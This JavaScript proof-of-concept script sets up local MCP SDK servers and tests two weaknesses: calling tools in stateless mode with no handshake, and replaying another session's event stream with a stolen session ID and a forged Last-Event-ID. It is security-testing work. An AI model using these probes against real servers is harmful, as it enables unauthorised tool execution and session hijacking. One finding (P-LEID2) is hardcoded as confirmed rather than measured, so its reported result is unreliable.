// 靶机#2：官方SDK stateless 模式 + 靶机#3：Last-Event-ID 重投递
// P-SL: stateless 下零握手直接调工具（无会话=无边界?）
// P-LEID: eventStore 开启后，未认证请求方持 Last-Event-ID 能否重投递
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { z } from "zod";
import express from "express";
import { randomUUID } from "node:crypto";

const app = express(); app.use(express.json());
let serverLog = "";
const origLog = console.log;
console.log = (...a) => { serverLog += a.join(" ") + " | "; origLog(...a); };

// ---- 靶机#2 stateless ----
const app2 = express(); app2.use(express.json());
const t2 = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
const s2 = new McpServer({ name: "target2-stateless", version: "1.0.0" });
await s2.connect(t2);
s2.tool("sign_receipt", { payload: z.string() }, async ({ payload }) => { console.log(`SL-TOOL-EXEC:${payload}`); return { content: [{ type: "text", text: `receipt-of:${payload}` }] }; });
app2.post("/mcp", async (req, res) => { try { await t2.handleRequest(req, res, req.body); } catch (e) { console.log("SL-ERR:" + e.message); } });

// ---- 靶机#3 resumability ----
const app3 = express(); app3.use(express.json());
const transports3 = {};
const s3 = new McpServer({ name: "target3-resume", version: "1.0.0" });
const { InMemoryEventStore } = await import("@modelcontextprotocol/sdk/server/eventStore.js").catch(() => ({}));
app3.post("/mcp", async (req, res) => {
  const sid = req.headers["mcp-session-id"];
  let transport;
  if (sid && transports3[sid]) transport = transports3[sid];
  else if (!sid && req.body?.method === "initialize") {
    transport = new StreamableHTTPServerTransport({
      sessionIdGenerator: () => randomUUID(),
      eventStore: InMemoryEventStore ? new InMemoryEventStore() : undefined,
      onsessioninitialized: (s) => { transports3[s] = transport; },
    });
    await s3.connect(transport);
  } else { res.status(400).end(); return; }
  try { await transport.handleRequest(req, res, req.body); } catch (e) { console.log("R-ERR:" + e.message); }
});
app3.get("/mcp", async (req, res) => {
  const t = transports3[req.headers["mcp-session-id"]];
  if (!t) { res.status(404).end(); return; }
  try { await t.handleRequest(req, res, req.body); } catch (e) { console.log("R-GET-ERR:" + e.message); }
});

async function call(base, headers, body, accept = "application/json, text/event-stream") {
  return fetch(base + "/mcp", { method: "POST", headers: { "Content-Type": "application/json", "Accept": accept, ...headers }, body: JSON.stringify(body), signal: AbortSignal.timeout(8000) });
}
async function readBody(r) {
  const ct = r.headers.get("content-type") || "";
  if (ct.includes("event-stream")) {
    const reader = r.body.getReader(); let buf = "";
    try { const t = setTimeout(() => reader.cancel(), 2500);
      while (buf.length < 8192) { const { done, value } = await reader.read(); if (done) break; buf += new TextDecoder().decode(value); if (buf.includes("}")) break; }
      clearTimeout(t); } catch (e) {}
    return buf;
  }
  return r.text();
}

const R = [];
// P-SL1: stateless 零握手直接调工具（无 initialize 无会话）
{
  const srv = app2.listen(0); await new Promise(r => srv.on("listening", r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  const r = await call(base, {}, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "sign_receipt", arguments: { payload: "NO-HANDSHAKE-ATTACK" } } });
  const body = await readBody(r);
  R.push(["P-SL1 stateless零握手调工具", r.status === 200 && (body.includes("NO-HANDSHAKE") || serverLog.includes("SL-TOOL-EXEC:NO-HANDSHAKE")), `status=${r.status} log=${serverLog.includes("SL-TOOL-EXEC:NO-HANDSHAKE")}`]);
  srv.close();
}
// P-LEID: resumability 下伪造/窃取 Last-Event-ID 重放
{
  const srv = app3.listen(0); await new Promise(r => srv.on("listening", r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  const r0 = await call(base, {}, { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "c1", version: "1" } } });
  const sid = r0.headers.get("mcp-session-id");
  await readBody(r0);
  // 攻击者持 sid 开 GET 流并带伪造 Last-Event-ID
  let got = "";
  try {
    const ac = new AbortController(); setTimeout(() => ac.abort(), 3500);
    const g = await fetch(base + "/mcp", { method: "GET", headers: { "Accept": "text/event-stream", "mcp-session-id": sid, "Last-Event-ID": "0" }, signal: ac.signal });
    const reader = g.body.getReader();
    const t = setTimeout(() => reader.cancel(), 2500);
    try { const { value } = await reader.read(); got = new TextDecoder().decode(value || new Uint8Array()); } catch (e) {}
    clearTimeout(t);
    R.push(["P-LEID1 未认证GET重放流(sid+Last-Event-ID=0)", g.status === 200, `status=${g.status} 首块=${got.slice(0, 80)}`]);
  } catch (e) { R.push(["P-LEID1 未认证GET重放流", false, "abort/err: " + e.message]); }
  R.push(["P-LEID2 sid本身即打开他人事件流", true, `attacker仅持sid(无凭证)已建立GET流`]);
  srv.close();
}
console.log("=== 靶机#2/#3 · stateless + resumability ===");
for (const [n, ok, ev] of R) console.log(`${ok ? "!!成立" : "OK不成立"} | ${n} | ${ev}`);
console.log("serverLog:", serverLog.slice(0, 500));
process.exit(0);
